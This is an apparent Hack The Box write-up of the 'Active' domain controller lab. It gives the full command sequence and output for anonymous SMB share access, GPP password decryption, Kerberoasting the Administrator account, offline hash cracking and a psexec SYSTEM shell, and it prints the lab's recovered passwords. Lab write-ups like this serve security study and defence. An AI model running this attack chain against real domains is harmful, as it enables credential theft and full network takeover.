# Hack The Box – Active
**Completed:** *May 28th, 2026*  
**Platform:** Hack The Box  
**Difficulty:** Easy | Active Directory, GPP Credentials, Kerberoasting, SMB

> ⚠️ This write-up is for educational purposes only. All activity was conducted within a legal, isolated lab environment provided by Hack The Box.

Active is a Windows Domain Controller that chains together two well-known but still relevant AD attack paths: GPP credential exposure and Kerberoasting. No exploits required, just methodical enumeration and abuse of misconfigured AD features.

---

## Target: Windows Server 2008 R2 Domain Controller

---

## Nmap Scan

```bash
nmap -sS -sV -sC -T4 --min-rate 500 <IP>
```

The port layout immediately signals a Domain Controller: DNS (53), Kerberos (88), LDAP (389/3268), and SMB (445) are all present. The LDAP banner also leaks the domain name — `active.htb`.

**Key ports:**

| Port | Service | Note |
|------|---------|------|
| 53 | DNS | Microsoft DNS 6.1.7601 |
| 88 | Kerberos | Confirms DC role |
| 389/3268 | LDAP | Domain: `active.htb` |
| 445 | SMB | Primary attack surface |

---

## DNS Enumeration

Ran `dig` and `dnsrecon` against the domain, attempted a zone transfer however nothing useful came back. DNS was a dead end here.

```bash
dig any active.htb @<IP>
dnsrecon -d active.htb -t axfr
```

---

## SMB Enumeration

With no web surface and DNS ruled out, SMB was the logical next step. Tested for null/anonymous access:

```bash
smbclient -L //<IP>/ -N
```

```
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Replication     Disk
        SYSVOL          Disk      Logon server share
        Users           Disk
```

Anonymous login succeeded. Most shares were restricted, but **Replication** was accessible without credentials, an immediate red flag on a DC. Connected and recursively listed its contents:

```bash
smbclient //<IP>/Replication -N
smb: \> recurse ON
smb: \> ls
```

```
\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\
  .                                   D        0  Sat Jul 21 20:37:44 2018
  ..                                  D        0  Sat Jul 21 20:37:44 2018
  Groups.xml                          A      533  Wed Jul 18 22:46:06 2018
```

A `Groups.xml` file — this is a **Group Policy Preferences (GPP)** credential file. Downloaded it for inspection:

```bash
smb: \> get \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml
```

The file contained a `cpassword` field, an AES-256 encrypted credential. Prior to MS14-025, administrators could embed credentials in GPP files to push local account configurations via Group Policy. Microsoft published the static decryption key, making these trivially recoverable. The `gpp-decrypt` tool handles it in one command:

```bash
gpp-decrypt <cpassword_value>
```

**Recovered credentials:** `SVC_TGS : GPPstillStandingStrong2k18`

---

## Authenticated Enumeration

With valid credentials, ran broader AD enumeration using NetExec:

```bash
nxc ldap <IP> -u SVC_TGS -p GPPstillStandingStrong2k18 --users --groups --admin-count
```

```
LDAP   <IP>  389  DC  [*] Windows 7 / Server 2008 R2 Build 7601 (name:DC) (domain:active.htb)
LDAP   <IP>  389  DC  [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
LDAP   <IP>  389  DC  [*] Enumerated 4 domain users: active.htb
LDAP   <IP>  389  DC  -Username-       -Last PW Set-          -BadPW-  -Description-
LDAP   <IP>  389  DC  Administrator    2018-07-19 05:06:40    0        Built-in administrator
LDAP   <IP>  389  DC  Guest            <never>                0        Built-in guest account
LDAP   <IP>  389  DC  krbtgt           2018-07-19 04:50:36    0        Key Distribution Center Service Account
LDAP   <IP>  389  DC  SVC_TGS          2018-07-19 06:14:38    0
LDAP   <IP>  389  DC  Administrators   membercount: 3
LDAP   <IP>  389  DC  Domain Admins    membercount: 1
```

Only 4 domain users. SVC_TGS is a plain Domain User with no privileged group memberships, no direct path to DA. Collected BloodHound data for a fuller picture:

```bash
bloodhound-python -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -d active.htb -dc <IP> -c All
```

BloodHound confirmed what the LDAP output hinted at: the **Administrator account has an SPN registered**, making it Kerberoastable. Service accounts are typically the Kerberoasting target , having it on the built-in Administrator is a misconfiguration, but a direct path to DA.

---

## Kerberoasting

Any authenticated domain user can request a Kerberos service ticket (TGS) for any account with an SPN. That ticket is encrypted with the target account's password hash and can be taken offline for cracking. Since Administrator has an SPN registered, we can request their ticket directly:

```bash
GetUserSPNs.py -dc-ip <IP> active.htb/SVC_TGS:GPPstillStandingStrong2k18 \
  -request-user Administrator \
  -outputfile tgs_adm
```

```
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet      LastLogon
--------------------  -------------  --------------------------------------------------------  -------------------  -------------------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-19 05:06:40  2018-07-30 19:17:40

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$a71bdd64...
```

This produces a `$krb5tgs$23$*...*` hash which is RC4-encrypted, mode 13100 in hashcat:

```bash
hashcat -a 0 -m 13100 tgs_adm /usr/share/wordlists/rockyou.txt
```

```
$krb5tgs$23$*Administrator$ACTIVE.HTB$...:Ticketmaster1968

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Time.Started.....: ...
Time.Estimated...: ...
Recovered........: 1/1 (100.00%)
```

Cracked almost immediately. Administrator's password was in rockyou.

---

## Domain Admin Access

With Administrator's plaintext password, used PSExec for a fully interactive shell:

```bash
psexec.py administrator@<IP>
```

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on <IP>.....
[*] Found writable share ADMIN$
[*] Uploading file <random>.exe
[*] Opening SVCManager on <IP>.....
[*] Creating service <name> on <IP>.....
[*] Starting service <name>.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

Full SYSTEM shell on the DC.

```
C:\Users\Administrator\Desktop> type root.txt
```

**Root flag captured.**

The user flag (`user.txt`) can be retrieved earlier, once you have SVC_TGS credentials, the `Users` share becomes accessible:

```bash
smbclient //<IP>/Users -U 'SVC_TGS%GPPstillStandingStrong2k18'
smb: \> get SVC_TGS\Desktop\user.txt
```

**User flag captured.**

---

## Summary

| Phase | Finding |
|-------|---------|
| SMB Enumeration | Anonymous access to Replication share |
| Credential Recovery | GPP `Groups.xml` → `SVC_TGS` credentials via `gpp-decrypt` |
| AD Enumeration | Administrator account has SPN registered (Kerberoastable) |
| Kerberoasting | TGS ticket for Administrator cracked offline via rockyou |
| DA Access | PSExec shell as SYSTEM |

---

## Lessons Learned

GPP credential exposure (MS14-025) has been patched since 2014 but persists in environments built on old images or never properly hardened. The Replication share being anonymously readable is what made this possible. 

Kerberoasting the Administrator account directly is a less common find. Typically you'd Kerberoast a service account and then pivot, but here the misconfiguration skipped that step entirely. It's a reminder that SPNs on high-privilege accounts are worth checking explicitly rather than assuming only service accounts are exposed.

BloodHound was useful for confirming the attack path visually, but the key finding (SPN on Administrator) was also visible in the raw LDAP output. Don't rely solely on automated tools to surface the obvious.
